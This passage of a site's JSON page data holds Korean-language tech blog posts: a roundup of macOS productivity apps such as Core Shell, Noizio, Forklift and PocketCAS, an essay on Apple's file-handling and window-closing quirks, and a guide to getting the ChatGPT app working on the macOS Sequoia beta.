class=\"content-ad\"></div>\n\n![image](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_4.png)\n\n- 만약 동료가 당신의 확장판을 좋아한다면, 모두 .tcbundle 파일에 담아 선물하세요.\n\n# #4. Core Shell\n\n## (무료 | Pro 버전 $9.99 | Setapp에서 이용 가능)\n\n<div class=\"content-ad\"></div>\n\n우리 사무실 공간에는 3,000대 이상의 PC 및 맥이 있습니다. 모두 SSH로 연결할 수 있어요.\n\nCompTIA A+인증을 받은 제가, 상사가 기술 문제로 달려와서 도움이 필요한 경우에 문제 해결 작업을 맡겨줍니다.\n\n터미널을 사용해서 SSH로 원격 시스템에 연결하여 시스템 로그를 확인해서 무슨 문제가 발생했는지 알아냅니다.\n\n어떤 사람들은 매주 두 번씩이나 자주 오게 됩니다. 이유를 모르지만 자주 문제가 발생하는 것 같아요. 그래도 좋아요 - 그래서 \"안녕하세요-안녕히 가세요 친구\" 몇 명을 사귀었거든요.\n\n<div class=\"content-ad\"></div>\n\n그런 사람들을 위해, 그들의 SSH 세부 정보를 ssh_config 파일에 보관하면 편리할 것 같았어요. 그렇게 하면 매번 설정을 물어보지 않아도 돼요.\n\n제이크의 맥에 접속하기 위해 ssh jakepopeye@192.168.0.100을 타이핑하는 대신, ssh Jake만 치면 되니까 편리하지 않나요?\n\n하지만, 아직 자랑스럽지 않아요. 최근에 시스템 문제가 있는 한 사람이 이것을 보고 웃음을 참지 못했어요.\n\n그는 무제한 SSH 구성을 저장하여 클릭 한 번으로 연결할 수 있는 제3자 터미널인 Core Shell을 사용하는 것을 제안했어요.\n\n<div class=\"content-ad\"></div>\n\n아, 그리고 Core Shell은 터미널과 달리 Safari와 유사한 다운로드/업로드 진행 막대를 제공합니다.\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_6.png\" />\n\n# #5. Moment\n\n## ($4.99 | Setapp에서 이용 가능)\n\n정말 그렇죠.\n시간을 추적하기 시작한 이후로 제 삶이 많이 변했어요. 미루고 있는 시간이 줄었답니다. 그리고 저는 어떻게 추적하고 있을까요?\n\n<div class=\"content-ad\"></div>\n\n아무 복잡한 앱이 아니라 Moment라는 작은 앱으로 이를 할 수 있어요.\n\n![image](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_7.png)\n\n이 앱을 사용해서 마감일을 지키고, 고객에게 청구할 프로젝트 작업 일수를 세고, 안 좋은 습관 90일 동안 끊는 것을 추적하고 있어요.\n\nMoment를 사용하면, 이렇게 할 수 있어요:\n\n<div class=\"content-ad\"></div>\n\n- 프로젝트 마감일, 생일 또는 결혼 기념일까지 카운트 다운 타이머를 만들어보세요.\n\n![이미지](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_8.png)\n\n- 하루, 한 달, 한 해 또는 사용자 정의 기간의 경과 시간을 추적하세요.\n\n![이미지](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_9.png)\n\n<div class=\"content-ad\"></div>\n\n- 가족들의 나이를 세어보세요 — 그들과 더 많은 시간을 보내기 위한 격려로요.\n\n![image](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_10.png)\n\n그리고 가장 좋은 부분은, 남자바에 카운트다운 또는 카운트업이 표시돼서 늘 동기부여가 되요.\n\n## #6. Noizio\n\n<div class=\"content-ad\"></div>\n\n## ($2.99 | Setapp에서 이용 가능)\n\n지난 주에 친척들이 집에 놀러 왔었어요.\n10살 미만의 다섯 명의 건방진 아이들이 여름 방학 8주를 최대한 즐기기 위해 준비를 해왔죠.\n\n저도 그들과 함께 놀고 싶지만, 23살인 저는 책임과 경력에 대한 생각밖에 할 수 없네요. 그래서 이 기사를 작성하고 있었어요.\n\n아이들은 아직 여기 있어요 — 그들의 크고 시끄러운 목소리가 집 안 곳곳에서 울려 퍼지고 있어요. 사실 방투가 방금 내 키보드에서 피아노를 연주하고 도망쳤어요.\n\n<div class=\"content-ad\"></div>\n\n그 이상한 단어들을 정리해야 하는 껄끄러운 일이 있었어요.\n\n아이들과 함께 있는 걸 좋아하지만, 나의 플로우 상태를 위험에 빠뜨리지 않아야 해요. 그래서 지금은 소음 취소 기능이 있는 AirPods Max를 착용하고 있어요.\n\n아무 소리도 들리지 않는 것은 마치 내 귀에서 공기를 뺏겨가는 것 같았어요 — 불편한 느낌이었죠. 어떤 음악이 필요했지만 집중은 계속해야 했어요.\n\n그래서 Noizio 앱을 설치했어요 — 집중을 돕기 위해 환경음을 재생해 주는 매우 간단한 앱이에요. 가장 좋은 점은 다양한 볼륨의 소리를 섞어 다른 경험을 즐길 수 있다는 거예요.\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_11.png\" />\n\n친구들과 함께 혼합물을 저장하고 내보낼 수도 있어요.\n\n```js\nNoizio가 제공하는 모든 소리들을 여기에서 확인해보세요:\n| 도시 공원의 새 소리      | 오래된 타자기 소리  |\n| 푸른 고래 소리           | 파리 카페 소리         |\n| 갈색 소음                | 분홍 소음           |\n| 모닥불 소리              | 놀이터 소리          |\n| 도시 거리 소리           | 시냇물 소리          |\n| 시계 소리                | 항해 요트 소리      |\n| 우주의 공허함 소리       | 파도 소리              |\n| 사막 소리               | 선박 모래의 소리      |\n| 농장 소리               | 우주 드론 소리         |\n| 개구리와 귀뚜라미 소리    | 지하철 소리           |\n| 유령 소리                | 여름밤 소리            |\n| 심장 박동 소리          | 맑은 날 소리          |\n| 지하철 소리            | 천둥 번개 소리    |\n| 키보드 타이핑 소리 | 열대 새 소리 |\n| 고양이 굴리는 소리 | 비닐 틈의 소음 |\n| 마법의 종소리 | 흰 소음 |\n| 밤의 부엉이 소리 | 바람종 소리 |\n| 10월의 비 소리 | 겨울 바람 소리 |\nα 알파, β 베타, γ 감마, δ 델타, θ 세타 파동.\n```\n\n# #7. Commander One\n\n<div class=\"content-ad\"></div>\n\n## (무료 | 전문가는 $29.99 | Setapp에서 이용 가능)\n\n내 사촌 Akhil은 업워크에서 프리랜서 비디오 편집자입니다.\n\n지난 해 그는 자신의 열정인 비디오 편집에 전념하기 위해 에이전시에서의 1년 6,000달러의 일자리를 그만 두었어요 (이건 인도에서 좋은 돈이에요).\n\n매일 그는 보통 2~3개의 장편 YouTube 비디오 프로젝트를 받아요. 그의 클라이언트들은 대체로 그에게 30~40개의 기본 클립을 보내고 각 비디오에 10~15개의 스톡 풋리지를 추가해 달라고 해요.\n\n<div class=\"content-ad\"></div>\n\n말 그대로 그는 클라이언트의 입력을 안전하게 보관하고 최상의 품질의 산출물을 적어도 3GB 크기로 다시 보내기 위해 충분한 클라우드 공간이 필요합니다.\n\n지금 그는 100 GB Google One 요금제를 사용 중이에요.\n그리고 빠른 시일 내에 200 GB 요금제로 업그레이드했으면 좋겠어요 - 그가 항상 최고의 성과를 이루길 바라는 마음 뿐이에요.\n\n어제 그가 서로 다른 두 클라우드 드라이브 폴더 사이에서 파일을 신속하게 이동하는 걸 보았어요 - 그는 한 개의 네이티브 앱을 사용했습니다. 저는 놀라웠고, 그 앱 이름을 Commander One이라는 것을 알게 되었죠.\n\n![Commander One](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_12.png)\n\n<div class=\"content-ad\"></div>\n\n그는 그것이 그의 일에 대한 거의 필수적이라고 말했어요.\n내가 물었을 때, 그는 대답했어요, \"그것은 파일을 폴더 간에 편리하게 이동할 수 있도록 해주는 듀얼 패널 파일 관리자 앱이에요. 이것을 통해 저는\n\n- 여러 클라우드와 서버를 연결하고 로컬처럼 작업할 수 있어요.\n- 파일을 원하는 수준으로 압축하고 압축 해제할 수 있어요. 그리고 언팩킹하지 않고 아카이브 내의 파일을 편집할 수도 있어요.\n- 안드로이드 폰이나 카메라의 미디어를 케이블을 통해 연결만 하면 바로 관리할 수 있어요. 추가 소프트웨어가 필요하지 않아요.\n- 파일 작업을 대기열에 넣을 수 있어요.\n\n그리고, 개발자로서 너, 니킬, 아래의 것들을 고려해보실 수도 있을 거에요.\n\n- 더 정확한 결과를 얻기 위해 RegEx를 사용하세요.\n- 어떤 폴더에서든지 빠르게 터미널 창을 열 수 있어요.\"\n\n<div class=\"content-ad\"></div>\n\n# #8. 포크리프트\n\n## ($19.95 | Setapp에서 이용 가능)\n\nCommander One의 UI에 있는 버튼이 너무 많아 당황스러우신가요? 저도 그랬어요.\n\n이렇게 PRO한 맥 앱을 쓰는 것이 익숙하지 않아요.\n\n<div class=\"content-ad\"></div>\n\n제 동생과 달리 간단하게 보이지만 더 강력한 듀얼-패널 파일 관리자인 Forklift를 설치했어요.\n\n![이미지](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_13.png)\n\nCommander One처럼 Forklift도 다음과 같은 기능을 제공해요:\n\n- 여러 클라우드 및 서버를 연결하고 파일을 관리할 수 있어요.\n- 전송을 대기열에 추가하고 실시간으로 진행 상황을 확인할 수 있어요.\n- 태그로 파일을 정리할 수 있어요.\n- 같은 패널에 여러 폴더 탭을 만들 수 있어요.\n- 현재 폴더 경로에서 터미널을 열 수 있어요.\n\n<div class=\"content-ad\"></div>\n\n그리고 Forklift로 할 수 있는 것을 Commander One으로는 할 수 없는 것은 다음과 같습니다:\n\n- 소스 간에 폴더/파일을 단방향 또는 양방향으로 동기화합니다.\n- 실수가 발생할 경우 파일 관리 로그를 확인합니다.\n- Forklift 내에서 직접 Dropbox 파일 링크를 생성합니다.\n- 앱을 마지막 조각까지 삭제합니다.\n- 다른 탭/패널 레이아웃을 작업 공간으로 저장하고 필요한 내용을로드합니다.\n- 앱에서 Git 작업을 직접 수행합니다.\n- 두 개의 텍스트 또는 이미지 파일을 비교합니다 (Xcode의 FileMerge, Kaleidoscope, Beyond Compare 또는 Araxis Merge 사용).\n\n그래서 대부분의 사람들에게 Forklift가 더 나은 옵션이라고 말할 수 있습니다.\n\n## #9. Trickster\n\n<div class=\"content-ad\"></div>\n\n## ($29.99 | Setapp에서 이용 가능)\n\n전 학생 출신인데 이제는 개발자이자 블로거이자 가끔 비디오 편집자로 활동하고 있는데, 하루에 수백, 수천 개의 파일을 다루게 되요.\n\n그리고 파레토가 말한 것처럼, 내 시간의 80%는 파일과 앱의 20%에 쏟아지게 돼요.\n\n시간이나 정신 에너지를 아껴주는 모든 것을 좋아해요. Trickster가 바로 거기에 속하는데, 제게 꼭 필요한 생산성 앱이랍니다.\n\n<div class=\"content-ad\"></div>\n\n\n![이미지](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_14.png)\n\n이것은 파일과 앱을 추적하고 빠르게 접근할 수 있는 메뉴 바 앱입니다. 특히 사용 빈도가 높은 20%에 대해서요.\n\n\"파일을 찾을 때 Spotlight를 사용하는 것이 어떻게 되지 않나요?\"라고 물을 수도 있습니다. 그러나 Trickster의 키보드 탐색은 더 편합니다. 어디서나 Trickster를 드러낼 때 ⌃Z를 누르기만 하면 됩니다. 그리고 화살표 키로 파일을 찾아 열 수 있습니다.\n\n가장 좋은 점은, 추가되거나 열거나 수정된 모든 파일을 추적하여 CPU를 과부하시키지 않습니다.\n\n\n<div class=\"content-ad\"></div>\n\n특정 폴더를 모니터링하도록 지정할 수 있어요. 원하면 모니터링을 일시 중지할 수도 있어요.\n\n그리고,\n\n- 화면에 고정하여 쉽게 파일에 액세스할 수 있어요 — 전체 화면에서도 가능해요.\n- 트릭스터에서 파일을 빠르게 미리보기하고 드래그하여 일반적으로 하는 것처럼 파일을 빼내실 수 있어요.\n- 사이드바에서 즐겨찾는 폴더를 쉽게 접근할 수 있어요.\n- 원하는 것만 볼 수 있도록 필터를 사용할 수 있어요.\n\n어플이 저를 가장 도와준 부분을 아시나요?\n내가 실수로 잘못된 파일 창을 닫았을 때, 그리고 방금 다운로드한 파일에 액세스하는 것을 도와줄 때 말이에요.\n\n<div class=\"content-ad\"></div>\n\n# #10. FilePane\n\n## ($6.99 | Setapp에서 이용 가능)\n\nFilePane은 필수적이지는 않지만 한 번 사용하면 필요한 앱입니다.\n\n파일을 끌 때 빠르게 파일 작업을 제공하는 편리한 앱입니다.\n\n<div class=\"content-ad\"></div>\n\n\n![이미지](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_15.png)\n\n단순히 파일(들)을 Yoink와 비슷한 선반에 넣으면 마법이 시작됩니다.\n\n예를 들어 설명해보겠습니다.\n\n이미지를 끌어다 놓는다고 가정해 보면, 다음과 같은 작업이 표시됩니다:\n\n\n<div class=\"content-ad\"></div>\n\n\n![image](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_16.png)\n\n- 자르기, 회전하기, 크기 조정하기, 변환하기, 압축하기\n- 데스크톱 배경으로 설정하기\n- 자유롭게 그리기\n\n비슷하게, 텍스트 파일을 끌어다 놓으면 다음 옵션이 나타납니다: 단어 및 글리프 수 보기 및 PDF로 변환하기.\n\nPDF 파일을 끌어다 놓으면 다음 옵션이 나타납니다: 여러 이미지로 분할하기 및 인쇄하기.\n\n\n<div class=\"content-ad\"></div>\n\n이러한 사항들은 모든 파일 유형에 적용됩니다:\n\n- Finder에서 보기 (단일 파일인 경우에만)\n- 모든 파일이 포함된 새 폴더 생성\n- 이메일, X, Facebook, AirDrop로 공유\n- 좋아하는 대상 폴더로 복사/이동\n- 크기 또는 경로를 클립보드에 복사 (단일 파일인 경우에만)\n- 휴지통에 넣기\n\n자주 사용하는 옵션들을 손쉽게 이용할 수 있다는 것은 항상 생산적인 느낌이 아닌가요?\n\n# #11. 유클리드\n\n<div class=\"content-ad\"></div>\n\n## ($2.99 | Setapp에서 이용 가능)\n\n유클리드는 아마도 학생, 회계사, 수학을 하는 모든 사람들을 위한 최고의 과학 계산기 앱일 거에요.\n\n그 이유는 뭐냐면?\n맥의 계산기가 할 수 있는 모든 일을 하기 때문이죠,\n\n-더 큰 계산을 수용할 수 있도록 매우 큰 화면 공간을 가지고 있어요.\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_17.png\" />\n\n- 클릭하지 않아도 실시간으로 계산 결과를 표시합니다.\n- 평균, 비트 시프트, 사인 등 100가지 이상의 과학 연산을 지원합니다.\n- f(x) = √(2x²+sin(x/2))와 같은 사용자 정의 함수를 만들고 x에 대한 값을 설정하여 결과를 얻을 수 있습니다.\n- Euclid는 많은 Excel 수식을 알고 있습니다. 익숙하다면 시도해보세요.\n- 단위를 변환할 수 있습니다.\n\n\n면적\n길이\n부피\n각도\n--------\n통화\n--------\n질량\n압력\n--------\n가속도\n소요 시간\n주파수\n속도\n--------\n에너지\n전력\n온도\n--------\n전하량\n전류\n전압\n저항\n--------\n농도\n--------\n연료 효율성\n\n\n<img src=\"/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_18.png\" />\n\n<div class=\"content-ad\"></div>\n\n- 60개의 이전 결과를 기억하니까 AC를 실수로 누르더라도 걱정할 필요 없어요.\n\n## #12. PocketCAS\n\n### (가격: $29.99 | Setapp에서 사용 가능)\n\n2018년에 입학한 대학 1학년 때 공부한 과목 중 하나인 \"공학용 미적분학\" 강의를 떠올려봐요.\n\n<div class=\"content-ad\"></div>\n\n저희 교수님은 상상할 수 있는 가장 이상한 수학 함수를 주고는 했어요. 그리고 Matlab을 사용해서 그래프를 그리라고 했죠.\n\n![image](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_19.png)\n\n우리는 코드를 입력하고 실행한 다음 2D 또는 3D 그래프를 공백 PDF에 복사해서 제출해야 했어요. 그리고 말했듯이 코딩은 힘들죠.\n\n당시에 Mac과 PocketCAS 앱이 있었으면 더 빨리 과제를 끝낼 수 있었을 텐데 하고 후회했어요.\n\n<div class=\"content-ad\"></div>\n\nPocketCAS는 macOS용으로 주장되는 가장 진보된 계산기 앱입니다. 5학년 학생부터 박사 교수까지 모두를 수학에서 도와줄 수 있어요.\n\n여기에 PocketCAS가 할 수 있는 모든 것들이 있어요. 이는:\n\n- 1+1, 2x5, 17÷2 등 모든 간단한 계산을 해결합니다.\n- 선형, 이차, 삼차 및 더 큰 방정식을 해결합니다.\n- 행렬을 위한 역행렬, 곱셈, 행렬식, 고유벡터 및 고유값을 계산할 수 있습니다.\n- 극한, 도함수, 적분 및 테일러 급수를 계산할 수 있습니다.\n\n![이미지](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_20.png)\n\n<div class=\"content-ad\"></div>\n\n- 2D 및 3D 플롯을 생성합니다.\n\n![image](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_21.png)\n\n- 사용자 정의 함수를 정의할 수 있도록 해주는 C와 비슷한 스크립팅 언어를 지원합니다.\n\n총평하면, 수학 애호가들을 위한 만능 앱입니다. 이제 더 이상 여러 수학 작업을 위해 여러 앱이나 탭을 사용할 필요가 없습니다.\n\n<div class=\"content-ad\"></div>\n\n## 더 맥오에스니꼬 어플을 찾고 계신다면, 이 글 읽어보세요\n\n## 마지막으로,\n\n새로운 iOS & Mac 어플을 발견하는 것을 좋아하신다면 (저와 같이), Setapp에 가입해보는 것을 고려해보세요. 매달 $9.99에 240개 이상의 멋진 어플을 골라 사용할 수 있습니다. 이 어플들을 개별로 구매할 경우 수백 달러가 들 수 있으니 참고하세요.\n\n- Setapp 여정을 시작하려면 제 제휴 링크를 사용해보세요! (30일간 무료로 이용 가능)\n- Setapp에서 제가 만든 100가지 최고의 macOS 어플 목록을 무료로 받아보세요.\n\n<div class=\"content-ad\"></div>\n\n새 이야기를 발행할 때마다 알림을 받으려면 475명 이상의 사람들을 참여하세요!\n\n이 게시물에는 제휴 링크가 포함되어 있습니다.","ogImage":{"url":"/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_0.png"},"coverImage":"/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_0.png","tag":["Tech"],"readingTime":16},{"title":"애플의 간결함 역설","description":"","date":"2024-06-19 01:05","slug":"2024-06-19-TheParadoxofAppleSimplicity","content":"\n\n\n![이미지](/assets/img/2024-06-19-TheParadoxofAppleSimplicity_0.png)\n\n일반적으로, Apple의 애플리케이션, 서비스 및 기기는 사용하기 쉬운 것 같지만, 수십 년간의 DOS, Windows 및 ChromeOS 사용 경험 이후 Apple이 몇 가지 간단한 것을 얼마나 어렵게 만들었는지 종종 놀랍습니다. 그러나 Apple이 그런 선택을 한 이유가 있는지, 그리고 이러한 차이가 실제로 개선인지 알아볼 필요가 있습니다.\n\n몇 가지 예를 들어보겠습니다 . . .\n\n## 파일 이동\n\n\n<div class=\"content-ad\"></div>\n\n한 가지 사례는 MacOS에서 파일을 이동하는 경우입니다. 애플 베테란이 매우 잘 알고 있듯이, 다른 운영 체제와 달리 'Finder'에는 파일을 이동시키는 \"잘라내기\" 기능이 없습니다. 대신 파일을 대상 위치로 복사한 다음 원본 파일을 삭제합니다. 왜 그럴까요? 사용자가 파일을 실수로 잘라내고 대상에 붙여넣기를 잊는 것을 막기 위해서일까요? 당신의 추측이 나와 같습니다.\n\n더욱 놀라운 것은 Finder에서 파일을 선택하고 Finder의 편집 메뉴에 액세스하면 \"잘라내기\"와 예상대로의 키보드 단축키가 보인다는 것입니다. 그러나 이것은 파일에는 작동하지 않으며 텍스트만을 잘라내기 위한 것으로 보입니다.\n\n🍎 실제로, 마우스나 트랙패드를 사용하여 파일을 동일한 또는 다른 Finder 창으로 드래그하여 이동할 수 있습니다. 그리고 Apple은 목적지 폴더에서 사용할 키보드 단축키 (Cmd+Option+V)를 가지고 있어 복사한 파일을 붙여넣고 원본 폴더에서 삭제하는 것이 가능합니다.\n\n<div class=\"content-ad\"></div>\n\n이러한 경우에서 이 기능은 파일이 여전히 사용 가능한지를 보증하여 사용자 보호를 위한 차이의 이유로 손을 든다.\n\n## 파일 삭제\n\n대부분의 운영 체제에서 간단한 파일 삭제 작업을 하면 사용자가 파일을 선택하고 키보드의 Delete 키를 눌러 파일을 삭제할 수 있습니다. MacOS에서는 Delete를 눌러도 선택한 파일에 아무런 영향을 주지 않습니다.\n\n🍎 만약 우클릭한다면 삭제 옵션이 없지만, \"휴지통으로 이동\" 옵션이 있어 원하는 작업을 완료할 수 있습니다. 더불어 \"휴지통으로 이동\" 명령에는 Cmd+Delete 빠른 키가 있습니다.\n\n<div class=\"content-ad\"></div>\n\n다시 한 번, Apple은 사용자들을 실수로 파일을 삭제하는 것으로부터 보호하고 더 신중한 작업을 통해 파일을 삭제하도록 강제하기 위해 노력하고 있는 것 같네요.\n\n## 오른쪽 텍스트 삭제\n\n여기에 한 가지 있습니다. 새로운 Apple 사용자들 중 많은 사람들이 어려워하는 것 같아요. Apple 기기에는 하나의 Delete 키만 있습니다. 이 키는 커서 왼쪽의 텍스트를 제거합니다. 다른 OS에서는 이 작업을 위한 Backspace 키와 커서 오른쪽의 문자를 제거하기 위한 별도의 Delete 키가 있습니다.\n\n이 부분은 키보드 공간을 절약하기 위해 한 개의 키를 생략해서 이렇게 작동하는 것으로 보이는데, 그렇다고 간단함이라고 라벨을 붙일 수도 있겠죠.\n\n<div class=\"content-ad\"></div>\n\n🍎 사실, 애플 제품 중 하나에는 예외가 있습니다. 바로 아래 사진에 나와 있는 외부 매직 키보드에 있는 숫자 키패드가 있습니다. 이 키보드에는 실제로 두 개의 키가 있습니다. 한 개는 Backspace를 나타내고, 다른 하나는 Delete를 나타내며, 이는 Windows 및 다른 운영 체제를 흉내냅니다. MacBook을 사용할 때는 몇 가지 키보드 단축키가 있습니다. FN+Delete 또는 CTRL+d를 사용하여 오른쪽으로 글자를 삭제할 수 있습니다.\n\n![이미지](/assets/img/2024-06-19-TheParadoxofAppleSimplicity_2.png)\n\n## 닫기 버튼인가요?\n\n다른 운영 체제와 마찬가지로, Apple은 화면에 열려있는 각 창에 대한 제어를 \"신호등\" 제어를 통해 제공합니다. 그러나 여러 창을 제어할 수 있는 애플리케이션(예: Word나 Pages에서 여러 문서를 열 때)의 경우, 빨간색 닫기 버튼이 다른 운영 체제의 X버튼처럼 애플리케이션을 닫지 않을 수도 있습니다. 모든 문서 창을 닫은 후에도 애플리케이션이 열려 있는 경우가 있습니다.\n\n<div class=\"content-ad\"></div>\n\n![파라독스](/assets/img/2024-06-19-TheParadoxofAppleSimplicity_3.png)\n\n다른 사용자들로부터 읽은 의견을 종합해보면, 언젠가는 대다수의 애플 사용자들을 크게 혼동시킨 것으로 알려져 있어요. 그러나, 저는 실제로 이것이 제 시간을 아낄 수 있는 기능임을 깨달았어요.\n\n예를 하나 들어볼게요. 저는 SnagIt을 사용하여 스크린샷을 캡처하고 주석을 달아요. 편집창에서 작업을 마치고 나면 창을 닫지만, 이 작업은 창만 닫고 앱을 닫지 않아요. 그래서 다음 스크린샷이 필요할 때를 위해 언제든 준비된 상태로 남아 있어요. 만약 창을 닫으면 앱도 같이 종료된다면, 매번 앱을 재시작해야 했을 거예요.\n\n🍎 애플리케이션을 닫는 방법에는 실제로 여러 가지 옵션이 있어요.\n\n<div class=\"content-ad\"></div>\n\n- 애플리케이션의 메인 메뉴에서 종료 명령을 선택하세요.\n- 활성화된 애플리케이션을 종료하려면 Cmd+Q 퀵 키를 사용하세요.\n- 독(Dock)에 있는 애플리케이션 아이콘을 우클릭하고 종료를 선택하세요.\n\n## 패러독스\n\n여기에서 애플 환경의 몇 가지 \"특징\"을 살펴보았습니다. 다른 운영 체제와 너무 다르기 때문에 애플의 실수처럼 보이거나 적어도 잘못된 단계인 것처럼 보입니다. 그러나 좀 더 면밀히 살펴보면, 애플이 이렇게 디자인하는 데에는 간단함이나 사용자 보호를 위한 매우 좋은 이유가 있을 수 있다는 것을 발견할 수 있습니다.\n\n이러한 애플의 딜레마 중 어떤 것이나 다른 것으로 고민한 적이 있나요? 그렇다면, 다른 사람들을 위해 이 게시물의 유용성을 높이기 위해 댓글에 지적해 주시면 매우 감사하겠습니다. 그리고 여기서 무언가가 잘못되었다면 알려주세요.\n\n<div class=\"content-ad\"></div>\n\n언제나 읽어 주셔서 감사합니다. J","ogImage":{"url":"/assets/img/2024-06-19-TheParadoxofAppleSimplicity_0.png"},"coverImage":"/assets/img/2024-06-19-TheParadoxofAppleSimplicity_0.png","tag":["Tech"],"readingTime":4},{"title":"맥OS Sequoia 베타 릴리스 1에서 OpenAI의 원본 ChatGPT 앱을 다시 작동시키는 방법","description":"","date":"2024-06-19 01:04","slug":"2024-06-19-HowtoGettheOriginalChatGPTAppbyOpenAIWorkingAgainonmacOSSequoiaBetaRelease1","content":"\n\n소개\n\n애플은 WWDC 2024에서 발표한 macOS 15의 최신 베타 버전인 \"Sequoia\"를 개발자 베타로 제공했습니다. 공개 베타 버전은 이번 여름 후반에 나오고, 최종 버전은 2024년 가을에 제공될 예정입니다.\n\nmacOS 15 Sequoia의 새로운 기능\n\nmacOS 15 Sequoia는 여러 가지 새로운 기능과 개선 사항을 소개했습니다.\n\n<div class=\"content-ad\"></div>\n\n- 아이폰 미러링: 사용자가 맥을 통해 아이폰을 미러링하고 상호작용할 수 있게 해주며 키보드와 마우스를 사용하여 아이폰 앱을 제어할 수 있습니다.\n- Safari 기능 업그레이드: \"하이라이트\"와 같은 기능을 통해 기계 학습을 사용하여 웹 페이지에서 관련 정보를 강조하고, 기사에 대한 요약과 목차를 제공하는 최신 \"리더\" 기능 등이 있습니다.\n- 창 타일링: 화면에 창을 자동으로 정리하여 멀티태스킹이 더 편리해집니다.\n- 암호 앱: 키체인을 대체하는 새로운 앱으로, 암호와 보안 키를 Apple 기기 전반에 걸쳐 관리하고 동기화하기 쉽게 합니다.\n- AI 및 기계 학습: Safari, Siri 및 노트와 같은 기능을 향상시키기 위해 AI를 더 깊게 통합한 것으로, Apple Intelligence와 OpenAI ChatGPT 4.0을 활용합니다.\n\nmacOS Sequoia는 Apple 실리콘 (M1, M2 등)을 탑재한 모든 기기와 iMac Pro (2017) 및 MacBook Pro (2018)과 같은 일부 오래된 인텔 기반 모델과 호환됩니다.\n\n호환성 문제\n\n첫 사용자이자 개발자로서 저는 기술의 최전선에 머무르려고 항상 노력합니다. 그러나 이번에는 OpenAI가 개발한 음성 채팅 기능이 포함된 ChatGPT 앱이 ChatGPT 로고만 있는 링크로 대체되었습니다. 처음에는 이것이 Apple과 OpenAI 사이의 통합의 일환인 줄 알았지만, 실망스러운 사실을 발견하게 되었습니다. 게다가, 저의 이전에 사용하던 기능적인 앱이 삭제되었습니다.\n\n<div class=\"content-ad\"></div>\n\n해결책\n\nChatGPT를 일찍 사용한 충실한 고객으로서, 베타 버전에 일찍 접속할 수 있었는데, 그 때는 완벽히 작동했어요. 이메일 아카이브를 절반 시간 동안 검색해보았지만, 포함된 베타 버전의 이메일을 찾을 수 없었어요.\n\n그 후 온라인으로 검색하여 OpenAI의 다운로드 페이지를 찾았어요: OpenAI ChatGPT 다운로드.\n\n다운로드는 원활히 진행되었지만, 앱을 설치하려고 할 때 문제가 발생했어요. macOS에서 ChatGPT_Desktop_public_latest.dmg 파일을 열 수 없었습니다. 대신 DAEMON Tools를 사용하여 이미지를 열어야 했어요. 그러면 앱을 Applications 폴더로 끌어다 놓을 수 있었어요. 이전 앱을 덮어쓸 것인지 확인하는 메시지가 나왔을 때, 그렇게 하려고 했지만 작동하지 않았어요. 기능이 있는 이전 앱을 추가하기 위해 둘 다 유지하도록 수락해야 했어요.\n\n<div class=\"content-ad\"></div>\n\n![이미지](/assets/img/2024-06-19-HowtoGettheOriginalChatGPTAppbyOpenAIWorkingAgainonmacOSSequoiaBetaRelease1_0.png)\n\n결론\n\n이 문제는 향후 업데이트로 해결될 것으로 예상되지만, 현재로서는 제가 찾은 해결책입니다. 이 가이드가 동일한 문제를 겪을 수 있는 다른 사람들에게 도움이 되고, 작동 중간 솔루션을 찾는 데 내가 소비한 시간을 절약해 드리기를 바랍니다.\n\n행동 요구\n\n<div class=\"content-ad\"></div>\n\n비슷한 문제를 겪은 적이 있거나 추가 팁이 있다면, 아래 댓글에 여러분의 경험을 공유해 주세요. 함께 macOS 업그레이드를 최대한 활용하도록 서로 도와줍시다!","ogImage":{"url":"/assets/img/2024-06-19-HowtoGettheOriginalChatGPTAppbyOpenAIWorkingAgainonmacOSSequoiaBetaRelease1_0.png"},"coverImage":"/assets/img/2024-06-19-HowtoGettheOriginalChatGPTAppbyOpenAIWorkingAgainonmacOSSequoiaBetaRelease1_0.png","tag":["Tech"],"readingTime":2}],"page":"102","totalPageCount":113,"totalPageGroupCount":6,"lastPageGroup":13,"currentPageGroup":5},"__N_SSG":true}